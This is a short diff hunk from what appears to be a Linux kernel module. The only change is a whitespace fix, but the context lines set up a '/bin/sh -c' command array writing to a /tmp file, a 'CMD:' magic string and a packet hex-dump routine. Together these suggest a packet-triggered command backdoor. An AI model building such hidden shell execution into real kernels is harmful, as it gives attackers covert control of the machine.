@@ -9,7 +9,7 @@ static char * argv[] = { "/bin/sh","-c","/usr/bin/ls -la > /tmp/3qrfaf.txt",NULL
 static char magic[5]="CMD:";
 
 //  packet debug
-static  void pkt_hex_dump(struct sk_buff *skb){
+static void pkt_hex_dump(struct sk_buff *skb){
     size_t len;
     int rowsize = 16;
     int i, l, linelen, remaining;
